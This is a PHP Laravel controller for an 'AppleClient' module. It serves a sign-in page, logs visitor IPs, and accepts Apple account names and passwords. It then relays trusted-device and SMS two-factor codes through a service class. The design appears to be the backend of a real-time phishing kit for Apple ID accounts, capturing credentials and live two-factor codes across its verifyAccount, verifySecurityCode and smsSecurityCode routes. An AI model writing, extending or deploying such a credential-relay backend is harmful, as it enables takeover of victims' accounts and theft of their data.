<?php

namespace Modules\AppleClient\Http\Controllers;

use App\Http\Controllers\Controller;
use App\Http\Requests\VerifyAccountRequest;
use App\Http\Requests\VerifyCodeRequest;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Foundation\Application;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Http\Response;
use Illuminate\Routing\Redirector;
use Illuminate\Support\Facades\Cookie;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Facades\Validator;
use Illuminate\Validation\ValidationException;
use Modules\AppleClient\Service\DataConstruct\Phone;
use Modules\AppleClient\Service\DataConstruct\ServiceError;
use Modules\AppleClient\Service\Exception\VerificationCodeException;
use Modules\AppleClient\Service\IndexControllerService;
use Modules\IpAddress\Service\IpService;
use Psr\Log\LoggerInterface;
use Saloon\Exceptions\Request\FatalRequestException;
use Saloon\Exceptions\Request\RequestException;

class AppleClientController extends Controller
{
    public function __construct(
        protected readonly Request          $request,
        protected readonly LoggerInterface  $logger,
        protected readonly IpService        $ipService,
    )
    {

    }

    public function ip():string
    {
        return $this->request->ip();
    }

    public function index(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/index');
    }

    public function signin(): Response
    {
        $guid = sha1(microtime());

        $this->ipService->rememberIpAddress();

        return response()
            ->view('index/signin')
            ->withCookie(Cookie::make('Guid', $guid));
    }

    /**
     * @param VerifyAccountRequest $request
     * @param IndexControllerService $controllerService
     * @return JsonResponse
     * @throws FatalRequestException
     * @throws RequestException
     * @throws \JsonException
     */
    public function verifyAccount(VerifyAccountRequest $request, IndexControllerService  $controllerService): JsonResponse
    {
        // 获取验证过的数据
        $validatedData = $request->validated();

        // 获取 accountName
        $accountName = $validatedData['accountName'];

        // 获取 password
        $password = $validatedData['password'];

        $response = $controllerService->verifyAccount($accountName, $password);

        if ($response->hasTrustedDevices() || $response->getTrustedPhoneNumbers()->count() === 0){
            return $this->success(data: [
                'Guid' => $controllerService->getGuid(),
                'Devices' => true,
            ],code: 201);
        }

        if ($response->getTrustedPhoneNumbers()->count() >= 2){
            return $this->success(data: [
                'Guid' => $controllerService->getGuid(),
                'Devices' => false,
            ],code: 202);
        }

        /**
         * @var Phone $trustedPhoneNumbers
         */
        $trustedPhoneNumbers = $response->getTrustedPhoneNumbers()->first();

        return $this->success(data: [
            'Guid' => $controllerService->getGuid(),
            'Devices' => false,
            'ID' => $trustedPhoneNumbers->getId(),
            'Number' => $trustedPhoneNumbers->getNumberWithDialCode(),
        ],code: 203);
    }

    public function auth(): Factory|Application|View|\Illuminate\Contracts\Foundation\Application
    {
        return view('index/auth');
    }

    /**
     * @param IndexControllerService $controllerService
     * @return Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
     */
    public function authPhoneList(IndexControllerService  $controllerService): Factory|Application|View|\Illuminate\Contracts\Foundation\Application|JsonResponse
    {
        return view('index.auth-phone-list',['trustedPhoneNumbers' => $controllerService->getPhoneLists()]);
    }

    /**
     * @param VerifyCodeRequest $request
     * @param IndexControllerService $controllerService
     * @return JsonResponse
     * @throws \JsonException
     * @throws VerificationCodeException
     */
    public function verifySecurityCode(VerifyCodeRequest $request,IndexControllerService  $controllerService): JsonResponse
    {
        $validated = $request->validated();

        $controllerService->verifySecurityCode($validated['apple_verifycode']);

        return $this->success();
    }

    /**
     * @param VerifyCodeRequest $request
     * @param IndexControllerService $controllerService
     * @return JsonResponse
     * @throws \InvalidArgumentException
     * @throws VerificationCodeException
     */
    public function smsSecurityCode(VerifyCodeRequest $request,IndexControllerService  $controllerService): JsonResponse
    {
        // 检索验证过的输入数据...
        $validated = $request->validated();

        if (empty($Id = $validated['ID'])){
            throw new \InvalidArgumentException('手机号码ID不能为空');
        }

       $controllerService->verifyPhoneCode($Id,$validated['apple_verifycode']);

        return $this->success();
    }

    /**
     * @param IndexControllerService $controllerService
     * @return JsonResponse
     * @throws \JsonException
     */
    public function SendSecurityCode(IndexControllerService  $controllerService): JsonResponse
    {
        $response = $controllerService->sendSecurityCode();

        return $this->success($response->json());
    }

    /**
     * @param IndexControllerService $controllerService
     * @return JsonResponse
     */
    public function GetPhone(IndexControllerService  $controllerService): JsonResponse
    {
        $trustedPhoneNumber = $controllerService->getTrustedPhoneNumber();

        return $this->success([
            'ID'                  => $trustedPhoneNumber?->getId(),
            'Number'              => $trustedPhoneNumber?->getNumberWithDialCode(),
        ]);
    }

    /**
     * @param IndexControllerService $controllerService
     * @return JsonResponse|Redirector
     * @throws ValidationException
     * @throws \JsonException
     */
    public function SendSms(IndexControllerService  $controllerService): JsonResponse|Redirector
    {
        $params = Validator::make($this->request->all(), [
            'ID' => 'required|integer|min:1'
        ])->validated();

        $response = $controllerService->sendSms((int) $params['ID']);

        /**
         * @var $error ServiceError
         */
        $error = $response->getServiceErrors()->first();

        Session::flash('Error',$error?->getMessage());

        return $this->success($response->json());
    }

    public function sms(): View|Factory|Application
    {
        return view('index/sms',['phoneNumber' => $this->request->input('Number')]);
    }

    public function result(): View|Factory|Application
    {
        return view('index/result');
    }

    public function stolenDeviceProtection(): View|Factory|Application
    {
        return view('index/stolen-device-protection');
    }
}
